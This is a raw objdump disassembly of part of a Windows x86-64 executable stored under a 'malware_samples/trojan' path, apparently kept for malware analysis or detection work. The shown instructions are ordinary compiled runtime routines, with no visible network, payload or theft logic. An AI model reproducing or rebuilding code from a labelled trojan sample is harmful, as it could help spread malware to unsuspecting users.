
malware_samples/trojan/a6377efa9912a9c5d6b85316b74c966d0031c657528f8258b0f8b7b09629d93f.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	55                   	push   %rbp
   140001001:	48 83 ec 40          	sub    $0x40,%rsp
   140001005:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   14000100a:	48 c7 45 f8 fe ff ff 	movq   $0xfffffffffffffffe,-0x8(%rbp)
   140001011:	ff 
   140001012:	89 c8                	mov    %ecx,%eax
   140001014:	83 e0 03             	and    $0x3,%eax
   140001017:	83 f8 01             	cmp    $0x1,%eax
   14000101a:	75 59                	jne    0x140001075
   14000101c:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140001020:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140001024:	48 8b 41 ff          	mov    -0x1(%rcx),%rax
   140001028:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000102c:	48 8b 41 07          	mov    0x7(%rcx),%rax
   140001030:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140001034:	48 8b 00             	mov    (%rax),%rax
   140001037:	48 85 c0             	test   %rax,%rax
   14000103a:	74 06                	je     0x140001042
   14000103c:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140001040:	ff d0                	call   *%rax
   140001042:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140001046:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000104a:	48 8b 50 08          	mov    0x8(%rax),%rdx
   14000104e:	48 85 d2             	test   %rdx,%rdx
   140001051:	74 09                	je     0x14000105c
   140001053:	4c 8b 40 10          	mov    0x10(%rax),%r8
   140001057:	e8 74 0d 00 00       	call   0x140001dd0
   14000105c:	ba 18 00 00 00       	mov    $0x18,%edx
   140001061:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140001067:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   14000106b:	48 83 c4 40          	add    $0x40,%rsp
   14000106f:	5d                   	pop    %rbp
   140001070:	e9 5b 0d 00 00       	jmp    0x140001dd0
   140001075:	90                   	nop
   140001076:	48 83 c4 40          	add    $0x40,%rsp
   14000107a:	5d                   	pop    %rbp
   14000107b:	c3                   	ret
   14000107c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001080:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001085:	55                   	push   %rbp
   140001086:	48 83 ec 20          	sub    $0x20,%rsp
   14000108a:	48 8d 6a 40          	lea    0x40(%rdx),%rbp
   14000108e:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140001092:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140001096:	48 8b 50 08          	mov    0x8(%rax),%rdx
   14000109a:	48 85 d2             	test   %rdx,%rdx
   14000109d:	74 0d                	je     0x1400010ac
   14000109f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400010a3:	4c 8b 40 10          	mov    0x10(%rax),%r8
   1400010a7:	e8 24 0d 00 00       	call   0x140001dd0
   1400010ac:	ba 18 00 00 00       	mov    $0x18,%edx
   1400010b1:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400010b7:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   1400010bb:	e8 10 0d 00 00       	call   0x140001dd0
   1400010c0:	90                   	nop
   1400010c1:	48 83 c4 20          	add    $0x20,%rsp
   1400010c5:	5d                   	pop    %rbp
   1400010c6:	c3                   	ret
   1400010c7:	cc                   	int3
   1400010c8:	cc                   	int3
   1400010c9:	cc                   	int3
   1400010ca:	cc                   	int3
   1400010cb:	cc                   	int3
   1400010cc:	cc                   	int3
   1400010cd:	cc                   	int3
   1400010ce:	cc                   	int3
   1400010cf:	cc                   	int3
   1400010d0:	55                   	push   %rbp
   1400010d1:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   1400010d8:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   1400010df:	00 
   1400010e0:	48 c7 45 08 fe ff ff 	movq   $0xfffffffffffffffe,0x8(%rbp)
   1400010e7:	ff 
   1400010e8:	48 85 c9             	test   %rcx,%rcx
   1400010eb:	0f 84 bb 00 00 00    	je     0x1400011ac
   1400010f1:	48 89 4d f0          	mov    %rcx,-0x10(%rbp)
   1400010f5:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1400010f9:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   1400010fd:	48 8d 05 1c 42 00 00 	lea    0x421c(%rip),%rax        # 0x140005320
   140001104:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140001108:	48 8d 05 79 b2 01 00 	lea    0x1b279(%rip),%rax        # 0x14001c388
   14000110f:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   140001113:	48 c7 45 b0 02 00 00 	movq   $0x2,-0x50(%rbp)
   14000111a:	00 
   14000111b:	48 c7 45 c8 00 00 00 	movq   $0x0,-0x38(%rbp)
   140001122:	00 
   140001123:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140001127:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   14000112b:	48 c7 45 c0 01 00 00 	movq   $0x1,-0x40(%rbp)
   140001132:	00 
   140001133:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140001137:	e8 e4 51 00 00       	call   0x140006320
   14000113c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140001140:	89 c1                	mov    %eax,%ecx
   140001142:	83 e1 03             	and    $0x3,%ecx
   140001145:	83 f9 01             	cmp    $0x1,%ecx
   140001148:	75 54                	jne    0x14000119e
   14000114a:	48 8d 48 ff          	lea    -0x1(%rax),%rcx
   14000114e:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140001152:	48 8b 48 ff          	mov    -0x1(%rax),%rcx
   140001156:	48 89 4d f8          	mov    %rcx,-0x8(%rbp)
   14000115a:	48 8b 40 07          	mov    0x7(%rax),%rax
   14000115e:	48 89 45 00          	mov    %rax,0x0(%rbp)
   140001162:	48 8b 00             	mov    (%rax),%rax
   140001165:	48 85 c0             	test   %rax,%rax
   140001168:	74 06                	je     0x140001170
   14000116a:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   14000116e:	ff d0                	call   *%rax
   140001170:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140001174:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140001178:	48 8b 50 08          	mov    0x8(%rax),%rdx
   14000117c:	48 85 d2             	test   %rdx,%rdx
   14000117f:	74 09                	je     0x14000118a
   140001181:	4c 8b 40 10          	mov    0x10(%rax),%r8
   140001185:	e8 46 0c 00 00       	call   0x140001dd0
   14000118a:	ba 18 00 00 00       	mov    $0x18,%edx
   14000118f:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140001195:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140001199:	e8 32 0c 00 00       	call   0x140001dd0
   14000119e:	b8 01 00 00 00       	mov    $0x1,%eax
   1400011a3:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   1400011aa:	5d                   	pop    %rbp
   1400011ab:	c3                   	ret
   1400011ac:	31 c0                	xor    %eax,%eax
   1400011ae:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   1400011b5:	5d                   	pop    %rbp
   1400011b6:	c3                   	ret
   1400011b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400011be:	00 00 
   1400011c0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400011c5:	55                   	push   %rbp
   1400011c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400011ca:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   1400011d1:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   1400011d5:	e8 26 fe ff ff       	call   0x140001000
   1400011da:	90                   	nop
   1400011db:	48 83 c4 20          	add    $0x20,%rsp
   1400011df:	5d                   	pop    %rbp
   1400011e0:	c3                   	ret
   1400011e1:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400011e8:	0f 1f 84 00 00 00 00 
   1400011ef:	00 
   1400011f0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400011f5:	55                   	push   %rbp
   1400011f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400011fa:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   140001201:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140001205:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140001209:	48 8b 50 08          	mov    0x8(%rax),%rdx
   14000120d:	48 85 d2             	test   %rdx,%rdx
   140001210:	74 0d                	je     0x14000121f
   140001212:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140001216:	4c 8b 40 10          	mov    0x10(%rax),%r8
   14000121a:	e8 b1 0b 00 00       	call   0x140001dd0
   14000121f:	ba 18 00 00 00       	mov    $0x18,%edx
   140001224:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000122a:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   14000122e:	e8 9d 0b 00 00       	call   0x140001dd0
   140001233:	90                   	nop
   140001234:	48 83 c4 20          	add    $0x20,%rsp
   140001238:	5d                   	pop    %rbp
   140001239:	c3                   	ret
   14000123a:	cc                   	int3
   14000123b:	cc                   	int3
   14000123c:	cc                   	int3
   14000123d:	cc                   	int3
   14000123e:	cc                   	int3
   14000123f:	cc                   	int3
   140001240:	55                   	push   %rbp
   140001241:	56                   	push   %rsi
   140001242:	48 83 ec 38          	sub    $0x38,%rsp
   140001246:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   14000124b:	48 c7 45 00 fe ff ff 	movq   $0xfffffffffffffffe,0x0(%rbp)
   140001252:	ff 
   140001253:	0f b6 05 97 ae 07 00 	movzbl 0x7ae97(%rip),%eax        # 0x14007c0f1
   14000125a:	b9 26 00 00 00       	mov    $0x26,%ecx
   14000125f:	ba 01 00 00 00       	mov    $0x1,%edx
   140001264:	e8 57 0b 00 00       	call   0x140001dc0
   140001269:	48 85 c0             	test   %rax,%rax
   14000126c:	74 6b                	je     0x1400012d9
   14000126e:	48 89 c6             	mov    %rax,%rsi
   140001271:	0f 10 05 b8 b4 01 00 	movups 0x1b4b8(%rip),%xmm0        # 0x14001c730
   140001278:	0f 11 40 10          	movups %xmm0,0x10(%rax)
   14000127c:	0f 10 05 9d b4 01 00 	movups 0x1b49d(%rip),%xmm0        # 0x14001c720
   140001283:	0f 11 00             	movups %xmm0,(%rax)
   140001286:	48 b8 65 20 6d 65 6d 	movabs $0x79726f6d656d2065,%rax
   14000128d:	6f 72 79 
   140001290:	48 89 46 1e          	mov    %rax,0x1e(%rsi)
   140001294:	0f b6 05 56 ae 07 00 	movzbl 0x7ae56(%rip),%eax        # 0x14007c0f1
   14000129b:	b9 18 00 00 00       	mov    $0x18,%ecx
   1400012a0:	ba 08 00 00 00       	mov    $0x8,%edx
   1400012a5:	e8 16 0b 00 00       	call   0x140001dc0
   1400012aa:	48 85 c0             	test   %rax,%rax
   1400012ad:	74 39                	je     0x1400012e8
   1400012af:	48 c7 00 26 00 00 00 	movq   $0x26,(%rax)
   1400012b6:	48 89 70 08          	mov    %rsi,0x8(%rax)
   1400012ba:	48 c7 40 10 26 00 00 	movq   $0x26,0x10(%rax)
   1400012c1:	00 
   1400012c2:	4c 8d 05 07 b1 01 00 	lea    0x1b107(%rip),%r8        # 0x14001c3d0
   1400012c9:	b1 28                	mov    $0x28,%cl
   1400012cb:	48 89 c2             	mov    %rax,%rdx
   1400012ce:	48 83 c4 38          	add    $0x38,%rsp
   1400012d2:	5e                   	pop    %rsi
   1400012d3:	5d                   	pop    %rbp
   1400012d4:	e9 57 40 00 00       	jmp    0x140005330
   1400012d9:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400012de:	ba 26 00 00 00       	mov    $0x26,%edx
   1400012e3:	e8 5d a3 01 00       	call   0x14001b645
   1400012e8:	48 89 75 f8          	mov    %rsi,-0x8(%rbp)
   1400012ec:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400012f1:	ba 18 00 00 00       	mov    $0x18,%edx
   1400012f6:	e8 64 a3 01 00       	call   0x14001b65f
   1400012fb:	0f 0b                	ud2
   1400012fd:	0f 1f 00             	nopl   (%rax)
   140001300:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001305:	55                   	push   %rbp
   140001306:	56                   	push   %rsi
   140001307:	48 83 ec 28          	sub    $0x28,%rsp
   14000130b:	48 8d 6a 30          	lea    0x30(%rdx),%rbp
   14000130f:	ba 26 00 00 00       	mov    $0x26,%edx
   140001314:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000131a:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   14000131e:	e8 ad 0a 00 00       	call   0x140001dd0
   140001323:	90                   	nop
   140001324:	48 83 c4 28          	add    $0x28,%rsp
   140001328:	5e                   	pop    %rsi
   140001329:	5d                   	pop    %rbp
   14000132a:	c3                   	ret
   14000132b:	cc                   	int3
   14000132c:	cc                   	int3
   14000132d:	cc                   	int3
   14000132e:	cc                   	int3
   14000132f:	cc                   	int3
   140001330:	48 83 ec 28          	sub    $0x28,%rsp
   140001334:	48 8b 09             	mov    (%rcx),%rcx
   140001337:	e8 14 00 00 00       	call   0x140001350
   14000133c:	48 89 c1             	mov    %rax,%rcx
   14000133f:	48 83 c4 28          	add    $0x28,%rsp
   140001343:	e9 88 fd ff ff       	jmp    0x1400010d0
   140001348:	cc                   	int3
   140001349:	cc                   	int3
   14000134a:	cc                   	int3
   14000134b:	cc                   	int3
   14000134c:	cc                   	int3
   14000134d:	cc                   	int3
   14000134e:	cc                   	int3
   14000134f:	cc                   	int3
   140001350:	48 83 ec 28          	sub    $0x28,%rsp
   140001354:	ff d1                	call   *%rcx
   140001356:	90                   	nop
   140001357:	48 83 c4 28          	add    $0x28,%rsp
   14000135b:	c3                   	ret
   14000135c:	cc                   	int3
   14000135d:	cc                   	int3
   14000135e:	cc                   	int3
   14000135f:	cc                   	int3
   140001360:	48 83 ec 38          	sub    $0x38,%rsp
   140001364:	48 89 d0             	mov    %rdx,%rax
   140001367:	48 8b 09             	mov    (%rcx),%rcx
   14000136a:	80 39 00             	cmpb   $0x0,(%rcx)
   14000136d:	74 34                	je     0x1400013a3
   14000136f:	48 ff c1             	inc    %rcx
   140001372:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140001377:	48 8d 0d 4a b1 01 00 	lea    0x1b14a(%rip),%rcx        # 0x14001c4c8
   14000137e:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140001383:	48 8d 15 cf b1 01 00 	lea    0x1b1cf(%rip),%rdx        # 0x14001c559
   14000138a:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000138f:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001395:	48 89 c1             	mov    %rax,%rcx
   140001398:	e8 f3 5b 01 00       	call   0x140016f90
   14000139d:	90                   	nop
   14000139e:	48 83 c4 38          	add    $0x38,%rsp
   1400013a2:	c3                   	ret
   1400013a3:	48 8d 15 ab b1 01 00 	lea    0x1b1ab(%rip),%rdx        # 0x14001c555
   1400013aa:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400013b0:	48 89 c1             	mov    %rax,%rcx
   1400013b3:	48 83 c4 38          	add    $0x38,%rsp
   1400013b7:	e9 84 59 01 00       	jmp    0x140016d40
   1400013bc:	cc                   	int3
   1400013bd:	cc                   	int3
   1400013be:	cc                   	int3
   1400013bf:	cc                   	int3
   1400013c0:	48 8b 09             	mov    (%rcx),%rcx
   1400013c3:	8b 42 34             	mov    0x34(%rdx),%eax
   1400013c6:	a8 10                	test   $0x10,%al
   1400013c8:	0f 85 92 7c 01 00    	jne    0x140019060
   1400013ce:	a8 20                	test   $0x20,%al
   1400013d0:	0f 85 3a 7d 01 00    	jne    0x140019110
   1400013d6:	e9 d5 82 01 00       	jmp    0x1400196b0
   1400013db:	cc                   	int3
   1400013dc:	cc                   	int3
   1400013dd:	cc                   	int3
   1400013de:	cc                   	int3
   1400013df:	cc                   	int3
   1400013e0:	8b 42 34             	mov    0x34(%rdx),%eax
   1400013e3:	a8 10                	test   $0x10,%al
   1400013e5:	0f 85 35 7f 01 00    	jne    0x140019320
   1400013eb:	a8 20                	test   $0x20,%al
   1400013ed:	0f 85 dd 7f 01 00    	jne    0x1400193d0
   1400013f3:	e9 d8 86 01 00       	jmp    0x140019ad0
   1400013f8:	cc                   	int3
   1400013f9:	cc                   	int3
   1400013fa:	cc                   	int3
   1400013fb:	cc                   	int3
   1400013fc:	cc                   	int3
   1400013fd:	cc                   	int3
   1400013fe:	cc                   	int3
   1400013ff:	cc                   	int3
   140001400:	48 8b 11             	mov    (%rcx),%rdx
   140001403:	48 85 d2             	test   %rdx,%rdx
   140001406:	74 0f                	je     0x140001417
   140001408:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   14000140c:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001412:	e9 b9 09 00 00       	jmp    0x140001dd0
   140001417:	c3                   	ret
   140001418:	cc                   	int3
   140001419:	cc                   	int3
   14000141a:	cc                   	int3
   14000141b:	cc                   	int3
   14000141c:	cc                   	int3
   14000141d:	cc                   	int3
   14000141e:	cc                   	int3
   14000141f:	cc                   	int3
   140001420:	55                   	push   %rbp
   140001421:	48 83 ec 40          	sub    $0x40,%rsp
   140001425:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   14000142a:	48 c7 45 f8 fe ff ff 	movq   $0xfffffffffffffffe,-0x8(%rbp)
   140001431:	ff 
   140001432:	48 8b 01             	mov    (%rcx),%rax
   140001435:	89 c1                	mov    %eax,%ecx
   140001437:	83 e1 03             	and    $0x3,%ecx
   14000143a:	83 f9 01             	cmp    $0x1,%ecx
   14000143d:	75 59                	jne    0x140001498
   14000143f:	48 8d 48 ff          	lea    -0x1(%rax),%rcx
   140001443:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
   140001447:	48 8b 48 ff          	mov    -0x1(%rax),%rcx
   14000144b:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   14000144f:	48 8b 40 07          	mov    0x7(%rax),%rax
   140001453:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140001457:	48 8b 00             	mov    (%rax),%rax
   14000145a:	48 85 c0             	test   %rax,%rax
   14000145d:	74 06                	je     0x140001465
   14000145f:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140001463:	ff d0                	call   *%rax
   140001465:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   140001469:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000146d:	48 8b 50 08          	mov    0x8(%rax),%rdx
   140001471:	48 85 d2             	test   %rdx,%rdx
   140001474:	74 09                	je     0x14000147f
   140001476:	4c 8b 40 10          	mov    0x10(%rax),%r8
   14000147a:	e8 51 09 00 00       	call   0x140001dd0
   14000147f:	ba 18 00 00 00       	mov    $0x18,%edx
   140001484:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000148a:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   14000148e:	48 83 c4 40          	add    $0x40,%rsp
   140001492:	5d                   	pop    %rbp
   140001493:	e9 38 09 00 00       	jmp    0x140001dd0
   140001498:	90                   	nop
   140001499:	48 83 c4 40          	add    $0x40,%rsp
   14000149d:	5d                   	pop    %rbp
   14000149e:	c3                   	ret
   14000149f:	90                   	nop
   1400014a0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400014a5:	55                   	push   %rbp
   1400014a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400014aa:	48 8d 6a 40          	lea    0x40(%rdx),%rbp
   1400014ae:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400014b2:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400014b6:	48 8b 50 08          	mov    0x8(%rax),%rdx
   1400014ba:	48 85 d2             	test   %rdx,%rdx
   1400014bd:	74 0d                	je     0x1400014cc
   1400014bf:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400014c3:	4c 8b 40 10          	mov    0x10(%rax),%r8
   1400014c7:	e8 04 09 00 00       	call   0x140001dd0
   1400014cc:	ba 18 00 00 00       	mov    $0x18,%edx
   1400014d1:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400014d7:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   1400014db:	e8 f0 08 00 00       	call   0x140001dd0
   1400014e0:	90                   	nop
   1400014e1:	48 83 c4 20          	add    $0x20,%rsp
   1400014e5:	5d                   	pop    %rbp
   1400014e6:	c3                   	ret
   1400014e7:	cc                   	int3
   1400014e8:	cc                   	int3
   1400014e9:	cc                   	int3
   1400014ea:	cc                   	int3
   1400014eb:	cc                   	int3
   1400014ec:	cc                   	int3
   1400014ed:	cc                   	int3
   1400014ee:	cc                   	int3
   1400014ef:	cc                   	int3
   1400014f0:	31 c0                	xor    %eax,%eax
   1400014f2:	c3                   	ret
   1400014f3:	cc                   	int3
   1400014f4:	cc                   	int3
   1400014f5:	cc                   	int3
   1400014f6:	cc                   	int3
   1400014f7:	cc                   	int3
   1400014f8:	cc                   	int3
   1400014f9:	cc                   	int3
   1400014fa:	cc                   	int3
   1400014fb:	cc                   	int3
   1400014fc:	cc                   	int3
   1400014fd:	cc                   	int3
   1400014fe:	cc                   	int3
   1400014ff:	cc                   	int3
   140001500:	c3                   	ret
   140001501:	cc                   	int3
   140001502:	cc                   	int3
   140001503:	cc                   	int3
   140001504:	cc                   	int3
   140001505:	cc                   	int3
   140001506:	cc                   	int3
   140001507:	cc                   	int3
   140001508:	cc                   	int3
   140001509:	cc                   	int3
   14000150a:	cc                   	int3
   14000150b:	cc                   	int3
   14000150c:	cc                   	int3
   14000150d:	cc                   	int3
   14000150e:	cc                   	int3
   14000150f:	cc                   	int3
   140001510:	48 b8 de c0 a4 37 27 	movabs $0xfc28282737a4c0de,%rax
   140001517:	28 28 fc 
   14000151a:	48 ba d7 ce 61 28 f4 	movabs $0xc044f2f42861ced7,%rdx
   140001521:	f2 44 c0 
   140001524:	c3                   	ret
   140001525:	cc                   	int3
   140001526:	cc                   	int3
   140001527:	cc                   	int3
   140001528:	cc                   	int3
   140001529:	cc                   	int3
   14000152a:	cc                   	int3
   14000152b:	cc                   	int3
   14000152c:	cc                   	int3
   14000152d:	cc                   	int3
   14000152e:	cc                   	int3
   14000152f:	cc                   	int3
   140001530:	48 83 ec 38          	sub    $0x38,%rsp
   140001534:	48 89 d0             	mov    %rdx,%rax
   140001537:	80 39 00             	cmpb   $0x0,(%rcx)
   14000153a:	74 34                	je     0x140001570
   14000153c:	48 ff c1             	inc    %rcx
   14000153f:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140001544:	48 8d 0d 7d af 01 00 	lea    0x1af7d(%rip),%rcx        # 0x14001c4c8
   14000154b:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140001550:	48 8d 15 91 af 01 00 	lea    0x1af91(%rip),%rdx        # 0x14001c4e8
   140001557:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000155c:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140001562:	48 89 c1             	mov    %rax,%rcx
   140001565:	e8 26 5a 01 00       	call   0x140016f90
   14000156a:	90                   	nop
   14000156b:	48 83 c4 38          	add    $0x38,%rsp
   14000156f:	c3                   	ret
   140001570:	48 8d 15 41 af 01 00 	lea    0x1af41(%rip),%rdx        # 0x14001c4b8
   140001577:	41 b8 0d 00 00 00    	mov    $0xd,%r8d
   14000157d:	48 89 c1             	mov    %rax,%rcx
   140001580:	48 83 c4 38          	add    $0x38,%rsp
   140001584:	e9 b7 57 01 00       	jmp    0x140016d40
   140001589:	cc                   	int3
   14000158a:	cc                   	int3
   14000158b:	cc                   	int3
   14000158c:	cc                   	int3
   14000158d:	cc                   	int3
   14000158e:	cc                   	int3
   14000158f:	cc                   	int3
   140001590:	48 83 ec 68          	sub    $0x68,%rsp
   140001594:	48 89 d0             	mov    %rdx,%rax
   140001597:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   14000159b:	48 89 54 24 60       	mov    %rdx,0x60(%rsp)
   1400015a0:	48 8d 15 71 af 01 00 	lea    0x1af71(%rip),%rdx        # 0x14001c518
   1400015a7:	48 89 54 24 50       	mov    %rdx,0x50(%rsp)
   1400015ac:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400015b1:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   1400015b6:	48 8d 15 8f af 01 00 	lea    0x1af8f(%rip),%rdx        # 0x14001c54c
   1400015bd:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   1400015c2:	48 8d 15 2f af 01 00 	lea    0x1af2f(%rip),%rdx        # 0x14001c4f8
   1400015c9:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   1400015ce:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400015d3:	48 c7 44 24 40 09 00 	movq   $0x9,0x40(%rsp)
   1400015da:	00 00 
   1400015dc:	48 c7 44 24 20 0b 00 	movq   $0xb,0x20(%rsp)
   1400015e3:	00 00 
   1400015e5:	48 8d 15 4c af 01 00 	lea    0x1af4c(%rip),%rdx        # 0x14001c538
   1400015ec:	4c 8d 0d 4e af 01 00 	lea    0x1af4e(%rip),%r9        # 0x14001c541
   1400015f3:	41 b8 09 00 00 00    	mov    $0x9,%r8d
   1400015f9:	48 89 c1             	mov    %rax,%rcx
   1400015fc:	e8 4f 58 01 00       	call   0x140016e50
   140001601:	90                   	nop
   140001602:	48 83 c4 68          	add    $0x68,%rsp
   140001606:	c3                   	ret
   140001607:	cc                   	int3
   140001608:	cc                   	int3
   140001609:	cc                   	int3
   14000160a:	cc                   	int3
   14000160b:	cc                   	int3
   14000160c:	cc                   	int3
   14000160d:	cc                   	int3
   14000160e:	cc                   	int3
   14000160f:	cc                   	int3
   140001610:	55                   	push   %rbp
   140001611:	41 57                	push   %r15
   140001613:	41 56                	push   %r14
   140001615:	56                   	push   %rsi
   140001616:	57                   	push   %rdi
   140001617:	53                   	push   %rbx
   140001618:	48 81 ec d8 00 00 00 	sub    $0xd8,%rsp
   14000161f:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140001626:	00 
   140001627:	0f 29 7d 40          	movaps %xmm7,0x40(%rbp)
   14000162b:	0f 29 75 30          	movaps %xmm6,0x30(%rbp)
   14000162f:	48 c7 45 28 fe ff ff 	movq   $0xfffffffffffffffe,0x28(%rbp)
   140001636:	ff 
   140001637:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000163b:	e8 10 3a 00 00       	call   0x140005050
   140001640:	31 c0                	xor    %eax,%eax
   140001642:	48 3b 45 f0          	cmp    -0x10(%rbp),%rax
   140001646:	0f 80 9e 04 00 00    	jo     0x140001aea
   14000164c:	0f 10 45 f0          	movups -0x10(%rbp),%xmm0
   140001650:	0f 10 4d 00          	movups 0x0(%rbp),%xmm1
   140001654:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   140001658:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   14000165c:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140001660:	e8 6b b4 00 00       	call   0x14000cad0
   140001665:	48 89 c1             	mov    %rax,%rcx
   140001668:	e8 03 6a 00 00       	call   0x140008070
   14000166d:	48 85 c0             	test   %rax,%rax
   140001670:	0f 84 a9 04 00 00    	je     0x140001b1f
   140001676:	49 89 d0             	mov    %rdx,%r8
   140001679:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   14000167d:	48 89 c2             	mov    %rax,%rdx
   140001680:	e8 5b b4 00 00       	call   0x14000cae0
   140001685:	48 8b 75 b0          	mov    -0x50(%rbp),%rsi
   140001689:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   14000168d:	48 01 f0             	add    %rsi,%rax
   140001690:	48 89 f1             	mov    %rsi,%rcx
   140001693:	48 89 75 20          	mov    %rsi,0x20(%rbp)
   140001697:	eb 1c                	jmp    0x1400016b5
   140001699:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400016a0:	48 ff c1             	inc    %rcx
   1400016a3:	81 c2 00 60 ff ff    	add    $0xffff6000,%edx
   1400016a9:	81 fa 00 ae ff ff    	cmp    $0xffffae00,%edx
   1400016af:	0f 83 91 00 00 00    	jae    0x140001746
   1400016b5:	48 39 c1             	cmp    %rax,%rcx
   1400016b8:	0f 84 f2 03 00 00    	je     0x140001ab0
   1400016be:	44 0f b6 11          	movzbl (%rcx),%r10d
   1400016c2:	41 0f b6 d2          	movzbl %r10b,%edx
   1400016c6:	84 d2                	test   %dl,%dl
   1400016c8:	79 d6                	jns    0x1400016a0
   1400016ca:	41 89 d0             	mov    %edx,%r8d
   1400016cd:	41 83 e0 1f          	and    $0x1f,%r8d
   1400016d1:	44 0f b6 59 01       	movzbl 0x1(%rcx),%r11d
   1400016d6:	41 83 e3 3f          	and    $0x3f,%r11d
   1400016da:	80 fa df             	cmp    $0xdf,%dl
   1400016dd:	76 41                	jbe    0x140001720
   1400016df:	44 0f b6 49 02       	movzbl 0x2(%rcx),%r9d
   1400016e4:	41 c1 e3 06          	shl    $0x6,%r11d
   1400016e8:	41 83 e1 3f          	and    $0x3f,%r9d
   1400016ec:	45 09 d9             	or     %r11d,%r9d
   1400016ef:	41 80 fa f0          	cmp    $0xf0,%r10b
   1400016f3:	72 3e                	jb     0x140001733
   1400016f5:	0f b6 51 03          	movzbl 0x3(%rcx),%edx
   1400016f9:	41 83 e0 07          	and    $0x7,%r8d
